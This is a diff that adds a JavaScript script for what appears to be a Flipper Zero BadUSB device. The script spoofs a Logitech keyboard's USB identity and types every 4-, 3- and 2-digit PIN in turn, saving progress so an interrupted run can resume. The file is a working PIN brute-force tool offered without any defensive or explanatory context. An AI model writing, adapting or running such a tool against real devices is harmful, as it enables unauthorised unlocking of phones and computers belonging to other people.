@@ -1,0 +1,81 @@
+let badusb = require("badusb");
+let storage = require("storage");
+
+let STATE_FILE_PATH = "/ext/apps_data/pin_tester_state.txt";
+let BATCH_SAVE_INTERVAL = 100;
+let lastCompletedPhase = 0;
+let lastCompletedValue = -1;
+let loopCounter = 0;
+
+let PHASES = [
+    { id: 1, max: 9999, len: 4 },
+    { id: 2, max: 999,  len: 3 },
+    { id: 3, max: 99,   len: 2 }
+];
+
+function waitForUSB() {
+    badusb.setup({ vid: 0x046D, pid: 0xC31C, mfrName: "Logitech", prodName: "Keyboard" });
+    let a = 0;
+    while (!badusb.isConnected() && a < 30) { delay(1000); a++; }
+    return badusb.isConnected();
+}
+
+function saveProgress(phase, value) {
+    let f = storage.openFile(STATE_FILE_PATH, "w", "create_always");
+    if (f) { f.write(phase.toString() + "\n" + value.toString()); f.close(); }
+}
+
+function loadProgress() {
+    if (!storage.fileExists(STATE_FILE_PATH)) { return; }
+    let f = storage.openFile(STATE_FILE_PATH, "r", "open_existing");
+    if (!f) { return; }
+    let info = storage.stat(STATE_FILE_PATH);
+    if (!info) { f.close(); return; }
+    let fc = f.read("ascii", info.size);
+    f.close();
+    if (!fc || fc.length === 0) { return; }
+    let b = -1;
+    let j = 0;
+    while (j < fc.length) { if (fc[j] === "\n") { b = j; break; } j++; }
+    if (b === -1) { return; }
+    lastCompletedPhase = +(fc.slice(0, b));
+    lastCompletedValue = +(fc.slice(b + 1));
+}
+
+function main() {
+    if (!waitForUSB()) { return; }
+    loadProgress();
+
+    let p = 0;
+    while (p < PHASES.length) {
+        let ph = PHASES[p];
+        if (lastCompletedPhase > ph.id) { p++; continue; }
+
+        let pId = ph.id;
+        let pLen = ph.len;
+        let base = "000000".slice(0, pLen);
+
+        let i = (lastCompletedPhase === pId && lastCompletedValue >= 0)
+            ? lastCompletedValue
+            : ph.max;
+
+        loopCounter = 0;
+
+        while (i >= 0) {
+            badusb.println((base + i.toString()).slice(-pLen));
+            i--;
+            loopCounter++;
+            if (loopCounter >= BATCH_SAVE_INTERVAL) {
+                if (!badusb.isConnected()) { return; }
+                if (i >= 0) { saveProgress(pId, i); }
+                loopCounter = 0;
+            }
+        }
+        saveProgress(pId + 1, -1);
+        loopCounter = 0;
+        p++;
+    }
+    storage.remove(STATE_FILE_PATH);
+}
+
+main();
